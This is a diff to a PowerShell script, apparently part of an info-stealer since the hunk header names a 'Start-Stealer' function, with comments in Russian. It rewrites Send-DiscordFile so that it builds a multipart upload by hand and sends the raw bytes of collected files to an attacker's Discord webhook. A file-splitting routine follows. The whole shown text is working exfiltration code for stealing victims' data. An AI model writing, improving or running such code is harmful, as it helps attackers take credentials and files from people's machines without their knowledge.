@@ -136,19 +136,43 @@ function Start-Stealer {
 }
 
 # --- Отправка файла (или части) в Discord ---
+# --- отправка файла или части в Discord ---
 function Send-DiscordFile {
     param($FilePath, $Caption)
+    $boundary = [System.Guid]::NewGuid().ToString()
     $fileName = Split-Path -Leaf $FilePath
+    $url = $DiscordWebhook
+
+    $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
+    $payload = "------$boundary`r`n"
+    $payload += "Content-Disposition: form-data; name=`"payload_json`"`r`n"
+    $payload += "`r`n"
+    $payload += '{"content":"'+$Caption+'"}'
+    $payload += "`r`n------$boundary`r`n"
+    $payload += "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"`r`n"
+    $payload += "Content-Type: application/octet-stream`r`n"
+    $payload += "`r`n"
+
+    $bytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
+    $end = "`r`n------$boundary--`r`n"
+    $endBytes = [System.Text.Encoding]::UTF8.GetBytes($end)
+
+    $content = New-Object System.IO.MemoryStream
+    $content.Write($bytes, 0, $bytes.Length)
+    $content.Write($fileBytes, 0, $fileBytes.Length)
+    $content.Write($endBytes, 0, $endBytes.Length)
+    $content.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
+
+    $headers = @{
+        "Content-Type" = "multipart/form-data; boundary=$boundary"
+    }
     try {
-        $Form = @{
-            "file" = Get-Item $FilePath
-            "payload_json" = '{"content": "' + $Caption + '"}'
-        }
-        Invoke-RestMethod -Method Post -Uri $DiscordWebhook -Form $Form -TimeoutSec 120
+        Invoke-WebRequest -Uri $url -Method Post -Body $content -Headers $headers -TimeoutSec 120
     } catch {
         Write-Warning "Failed to send file to Discord: $($_.Exception.Message)"
     }
 }
+
 
 # --- Разделение файла на части ---
 function Split-File {
